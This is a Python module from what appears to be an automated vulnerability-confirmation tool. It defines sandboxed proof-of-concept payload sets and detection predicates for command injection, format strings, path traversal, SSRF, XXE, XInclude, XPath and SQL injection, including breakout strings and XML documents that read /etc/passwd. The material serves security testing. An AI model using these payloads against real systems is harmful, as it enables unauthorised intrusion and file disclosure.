"""Deterministic injection PoC probes (no fuzzing): command injection, format string, path
traversal. Each probe knows the sinks that make it relevant, a set of payloads carrying a
unique per-run marker, and an output-based confirmation predicate -- so a static candidate
becomes a *confirmed* finding with a working demonstrating input, verified in the sandbox.

Confirmation is proof-by-effect: the injected command's marker appears in output (CWE-78), the
format directives leaked pointers instead of echoing verbatim (CWE-134), or /etc/passwd content
came back (CWE-22). Reachability is the same honest limit as the overflow synthesizer: the
payload is delivered to the entry channel, so it reaches input-driven sinks.
"""
from __future__ import annotations

import re


def cmdi_payloads(marker: str):
    m = marker
    # shell metacharacters that break out of system()/popen() argument construction
    return [f"; echo {m}", f"$(echo {m})", f"`echo {m}`", f"| echo {m}", f"&& echo {m}",
            f"' ; echo {m} ; '", f'" ; echo {m} ; "', f"\n echo {m}\n"]


def cmdi_confirm(out: bytes, payload: str, marker: str) -> bool:
    # the marker must appear because the injected `echo` RAN -- not because the program echoed
    # our payload verbatim. If the literal "echo <marker>" is still in the output, it was printed,
    # not executed, so that is not a confirmation.
    mk = marker.encode()
    return mk in out and (b"echo " + mk) not in out


#: How many `%p` the recon payload asks for. Eight was the original width and it CONFIRMS the bug
#: (two interpreted directives are proof enough) while resolving nothing: the pointers that anchor a
#: base -- the saved return into the image, a libc pointer -- sit deeper than the eighth varargs
#: slot. Measured under the sandbox the probe actually uses (`sandbox.run`, ASLR off), 4 runs each,
#: counting only PLAUSIBLE bases: 24 directives proved one 0/4 on both fixtures, 32 proved the PIE
#: image base 4/4, and 40 proved a base 4/4 on PIE and non-PIE alike -- the depth at which the dump
#: reaches a libc pointer that a curated anchor matches. The short payloads stay, and are tried
#: after, for a sink whose buffer truncates this one (a truncated format string still interprets
#: the directives that fit, so the confirmation is not lost either way).
_FMT_DEEP = 40


def fmt_payloads(marker: str):
    return [marker.encode() + b".%p" * _FMT_DEEP,
            marker.encode() + b".%p.%p.%p.%p.%p.%p.%p.%p",
            marker.encode() + b"%x.%x.%x.%x.%x.%x.%x.%x"]


def fmt_confirm(out: bytes, payload: bytes, marker: str) -> bool:
    mk = marker.encode()
    if mk not in out:
        return False
    seg = out.split(mk, 1)[1][:200]
    if b"%p" in seg or b"%x" in seg:
        return False                                  # directives echoed verbatim -> not a fmt bug
    # interpreted directives leak pointers: hex words or (nil)/(null)
    return len(re.findall(rb"0x[0-9a-fA-F]+", seg)) >= 2 or b"(nil)" in seg or b"(null)" in seg


def sqli_payloads(marker: str):
    """UNION-based SQL injection payloads carrying `marker` as a selected column. If the input is
    concatenated into a query, the DB itself returns the marker as a row -- a forgery-proof oracle
    (a non-injectable target treats the payload as a literal string and never emits the marker). The
    original SELECT's arity is unknown, so a few column counts are tried, across single-quote,
    double-quote and numeric (unquoted) contexts, each terminated with a SQL comment."""
    m, out = marker, []
    # break out of: a single-quoted literal, a double-quoted literal, or an unquoted numeric field.
    for prefix in ("' ", '" ', "0 "):
        for n in (1, 2, 3, 4, 5):
            cols = ",".join([f"'{m}'"] + ["'x'"] * (n - 1))
            out.append(f"{prefix}UNION SELECT {cols}-- ")        # sqlite / mysql / pg line comment
            out.append(f"{prefix}UNION SELECT {cols}#")          # mysql hash comment
    # error-based: an unbalanced quote makes the DB raise a PARSE error for targets that surface it
    # (auth/count apps that never display query rows). The marker is appended so a verbatim echo of
    # the payload is distinguishable from a genuine engine error (see sqli_confirm).
    out += [f"'{m}", f'"{m}', f"') {m}", f"';{m}"]
    return out


# DB engine parse/structure errors: their presence proves the input reached the SQL parser. Scoped
# to messages a non-injectable (parameterised) target never emits for a literal string value.
_SQL_ERRORS = (b"unrecognized token", b"sql logic error", b"no such column", b"incomplete input",
               b"unterminated", b"syntax error", b"you have an error in your sql",
               b"unclosed quotation", b"quoted string not properly terminated", b"sqlstate",
               b"odbc", b"sqlite3::", b"near \"")


def sqli_confirm(out: bytes, payload, marker: str) -> bool:
    mk = marker.encode()
    pb = payload if isinstance(payload, bytes) else payload.encode()
    # (1) UNION: the marker surfaced because the SELECT RAN (the DB returned it as a row), NOT
    # because the program echoed our payload verbatim -- same shape as cmdi_confirm.
    if mk in out and pb not in out:
        return True
    # (2) error-based: an error payload (an unbalanced quote) made the engine raise a parse error.
    # Require the marker to NOT appear as the literal payload echo (which would mean reflection, not
    # execution), and a DB parse-error signature to be present -- a parameterised target raises none.
    low = out.lower()
    if b"union select" not in pb.lower() and pb not in out and any(e in low for e in _SQL_ERRORS):
        return True
    return False


def traversal_payloads():
    return [b"../../../../../../../../etc/passwd", b"..%2f..%2f..%2f..%2fetc/passwd",
            b"....//....//....//....//etc/passwd", b"/etc/passwd"]


def traversal_confirm(out: bytes, payload: bytes, marker: str) -> bool:
    return re.search(rb"root:.?:0:0:", out) is not None or b"root:x:0:" in out


def ssrf_payloads(marker=None):
    """Server-side request forgery: the fetched URL is attacker-controlled. The `file:` scheme
    demonstrates it OFFLINE (the server fetches a local file of our choosing); confirmed by the
    file content coming back. An internal-network pivot (http://169.254.169.254/, localhost
    services) is the same primitive but needs a live environment to observe."""
    return [b"file:///etc/passwd", b"file://localhost/etc/passwd", b"file:/etc/passwd",
            b"FILE:///etc/passwd"]


def xxe_payloads(marker=None):
    """XML external-entity file-disclosure documents: a SYSTEM entity pointing at /etc/passwd, in a
    few DTD/entity forms. Confirmed by the file's content coming back (same oracle as traversal)."""
    return [
        b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
        b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "/etc/passwd">]><r>&xxe;</r>',
        b'<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
        b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "file:///etc/passwd">'
        b'<!ENTITY xxe "%p;">]><r>&xxe;</r>',
    ]


def wordexp_payloads(marker: str):
    """`wordexp()` performs the SHELL's own expansions, command substitution among them -- so a
    user string reaching it is command injection in a binary with no `system` and no `popen`
    anywhere in it. Only the substitution forms are useful: `wordexp` REJECTS a bare `;` or `|` as
    a syntax error (measured: "bad pattern"), which is exactly why the `cmdi` payload set does not
    confirm here and this one is separate."""
    m = marker
    return [f"$(echo {m})", f"`echo {m}`", f"/tmp/$(echo {m})", f"$(echo {m} > /dev/stdout)"]


def xinclude_payloads(marker=None):
    """XInclude file disclosure. This is NOT an XXE variant: XInclude is a separate libxml2
    feature with its own file-reading power, and the standard XXE fix -- parsing without
    `XML_PARSE_NOENT` so external entities are never substituted -- does nothing to it. Measured
    on a parser built that way: the `<!ENTITY SYSTEM>` document came back with the entity
    UNEXPANDED while `<xi:include parse="text">` returned /etc/passwd.

    `parse="text"` rather than the default `parse="xml"` because /etc/passwd is not well-formed
    XML and an xml-parse include of it fails."""
    ns = b'xmlns:xi="http://www.w3.org/2001/XInclude"'
    return [
        b'<?xml version="1.0"?><r ' + ns +
        b'><xi:include href="file:///etc/passwd" parse="text"/></r>',
        b'<r ' + ns + b'><xi:include href="/etc/passwd" parse="text"/></r>',
        b'<?xml version="1.0"?><r ' + ns +
        b'><xi:include href="file:///etc/passwd" parse="text" encoding="utf-8"/></r>',
    ]


def xpath_payloads(marker: str):
    """XPath injection: the expression is built by concatenating a user string into a predicate.

    Two kinds, in attack order. The first break out of the quoted predicate and union in node sets
    the original expression could never reach -- `//*` returns the WHOLE document, which is the
    actual disclosure (measured: a lookup restricted to a `public` element returned every
    `secret` element in the document). The second are unbalanced quotes, which make the evaluator
    raise, and that is what `xpath_confirm` keys on: an engine syntax error proves the string
    reaches the evaluator in a target that escapes nothing, and a target that binds or escapes its
    value never produces one."""
    m = marker
    return [
        "x'] | //* | //a[name='",
        "'] | //*[1] | //a['",
        "x'] | //secret | //a[name='",
        "' or '1'='1",
        "x' or 1=1 or 'x",
        f"'{m}",                                         # unbalanced -> an evaluator error
        f"x'] {m} [",
    ]


#: libxml2 / XPath evaluator diagnostics. Each proves the input reached the EXPRESSION PARSER,
#: which a target that escapes or binds its value never lets happen for a literal string.
_XPATH_ERRORS = (b"xpath error", b"invalid predicate", b"invalid expression",
                 b"unregistered function", b"unfinished literal", b"expected $ for variable",
                 b"undefined namespace prefix", b"xpath failed")


def xpath_confirm(out: bytes, payload, marker: str) -> bool:
    """An evaluator error, with the payload NOT echoed verbatim -- the same two-part test as
    `sqli_confirm`'s error branch, and for the same reason: a program that prints the expression it
    built would otherwise confirm by reflection alone."""
    pb = payload if isinstance(payload, bytes) else str(payload).encode()
    low = out.lower()
    if not any(e in low for e in _XPATH_ERRORS):
        return False
    # The fixture class that prints its own query would reflect the payload; require the error to
    # come with something other than a bare echo of what we sent.
    return low.count(pb.lower()) <= 1


# name -> {cwe, severity, sinks, payloads(marker)->list, confirm(out,payload,marker)->bool, title}
#: WHAT A CONFIRMATION PROVES, which is not the same for every class and decides the rung.
#:
#: Every PoC here was filed at L1 -- "the defect is real, here is a reproducer" -- because the
#: ladder was built around crashes, where L1 means a verified crash and the effect is two rungs
#: further on. For an injection there is no crash and the oracle is the effect itself: the marker
#: appears in the output only because the shell RAN our `echo`, the DB returned our row, or
#: /etc/passwd came back. That is the end of the chain, not a step in it, and filing demonstrated
#: command execution one rung above "identified" understates every injection this platform finds.
#:
#: A MEMORY leak is the exception and stays where it is: pointer-shaped words out of a stack are
#: chain material, not an end effect, so the format string is levelled by whether its leak
#: RESOLVES a base (an L2 disclosure primitive) -- see inject_stage.
_PROVES_EFFECT = "effect"           # the oracle showed the attacker's end goal happen -> L3
_PROVES_CAPABILITY = "capability"   # the oracle showed only that the sink is reachable -> L2
_PROVES_LEAK = "leak"               # a memory disclosure: levelled by what it resolves


def sqli_returned_data(out: bytes, payload, marker: str) -> bool:
    """Did the DATABASE hand back the attacker's row (the UNION branch of `sqli_confirm`), or did
    only an error prove the string reaches the parser? The first is data disclosure demonstrated;
    the second is control of the query -- a primitive -- and the two are different rungs."""
    mk = marker.encode()
    pb = payload if isinstance(payload, bytes) else str(payload).encode()
    return mk in out and pb not in out


PROBES = {
    "command-injection": {
        "cwe": "CWE-78", "severity": "critical",
        "sinks": {"system", "popen", "execl", "execlp", "execv", "execve", "execvp"},
        "payloads": lambda m: cmdi_payloads(m), "confirm": cmdi_confirm,
        "proves": _PROVES_EFFECT,
        "title": "OS command injection", "binary": False},
    "format-string": {
        "cwe": "CWE-134", "severity": "high",
        "sinks": {"printf", "fprintf", "sprintf", "snprintf", "vprintf", "vfprintf",
                  "syslog", "err", "warn"},
        "payloads": lambda m: fmt_payloads(m), "confirm": fmt_confirm,
        "proves": _PROVES_LEAK,
        "title": "Format string", "binary": True},
    "path-traversal": {
        "cwe": "CWE-22", "severity": "high",
        "sinks": {"fopen", "fopen64", "open", "open64", "freopen"},
        "payloads": lambda m: traversal_payloads(), "confirm": traversal_confirm,
        "proves": _PROVES_EFFECT,
        "title": "Path traversal", "binary": True},
    "ssrf": {
        "cwe": "CWE-918", "severity": "high",
        # a user-controlled URL handed to an HTTP/URL client. curl is the dominant C one.
        "sinks": {"curl_easy_setopt", "curl_easy_perform", "curl_easy_init", "curl_url_set"},
        "payloads": lambda m: ssrf_payloads(m), "confirm": traversal_confirm,
        "proves": _PROVES_EFFECT,
        "title": "Server-side request forgery (SSRF)", "binary": True},
    "xxe": {
        "cwe": "CWE-611", "severity": "high",
        # libxml2 / libexpat document-parse entry points. Entity substitution must be enabled for
        # the disclosure to fire (XML_PARSE_NOENT); a target with it off simply never confirms.
        "sinks": {"xmlReadMemory", "xmlReadFile", "xmlReadDoc", "xmlReadFd", "xmlParseMemory",
                  "xmlParseFile", "xmlParseDoc", "xmlCtxtReadMemory", "xmlCtxtReadFile",
                  "xmlCtxtReadDoc", "xmlParseDocument", "XML_Parse"},
        "payloads": lambda m: xxe_payloads(m), "confirm": traversal_confirm,
        "proves": _PROVES_EFFECT,
        "title": "XML external entity (XXE)", "binary": True},
    "wordexp-command-substitution": {
        "cwe": "CWE-78", "severity": "critical",
        # wordexp/wordexp-adjacent expanders. NOT the `system`/`popen` family: the point of this
        # probe is the target that has NEITHER and still runs a command.
        "sinks": {"wordexp", "__wordexp", "wordexp_l"},
        "payloads": lambda m: wordexp_payloads(m), "confirm": cmdi_confirm,
        "proves": _PROVES_EFFECT,
        "title": "Command injection through shell expansion (wordexp)", "binary": True},
    "xinclude": {
        "cwe": "CWE-611", "severity": "high",
        # The XInclude processors. A target that calls one of these is exposed EVEN IF it parses
        # with external entities disabled, which is why this is not folded into the xxe probe.
        "sinks": {"xmlXIncludeProcess", "xmlXIncludeProcessFlags", "xmlXIncludeProcessTree",
                  "xmlXIncludeProcessTreeFlags", "xmlXIncludeProcessNode",
                  "xmlXIncludeProcessFlagsData", "xmlXIncludeNewContext"},
        "payloads": lambda m: xinclude_payloads(m), "confirm": traversal_confirm,
        "proves": _PROVES_EFFECT,
        "title": "XInclude file disclosure", "binary": True},
    "xpath-injection": {
        "cwe": "CWE-643", "severity": "high",
        # libxml2's XPath evaluators, taking an expression built as a string.
        "sinks": {"xmlXPathEval", "xmlXPathEvalExpression", "xmlXPathCompile",
                  "xmlXPathCompiledEval", "xmlXPathNodeEval", "xmlXPathEvalPredicate",
                  "xmlXPathCtxtCompile"},
        "payloads": lambda m: xpath_payloads(m), "confirm": xpath_confirm,
        # CAPABILITY, not EFFECT: the error proves we control the expression. What that DISCLOSES
        # depends on the document, and there is no document-independent marker an injected XPath 1.0
        # expression can make the engine emit -- `|` unions node sets and cannot introduce a
        # literal -- so claiming demonstrated disclosure from a generic payload would be a guess.
        "proves": _PROVES_CAPABILITY,
        "title": "XPath injection", "binary": True},
    "sql-injection": {
        "cwe": "CWE-89", "severity": "critical",
        # the query-string sinks (sqlite / mysql / postgres). A prepared-statement API that binds
        # parameters is NOT here -- only the string-concatenation execs an injection can reach.
        "sinks": {"sqlite3_exec", "sqlite3_get_table", "sqlite3_prepare", "sqlite3_prepare_v2",
                  "mysql_query", "mysql_real_query", "PQexec", "PQexecParams"},
        "payloads": lambda m: sqli_payloads(m), "confirm": sqli_confirm,
        "proves": _PROVES_EFFECT,
        "title": "SQL injection", "binary": True},
}
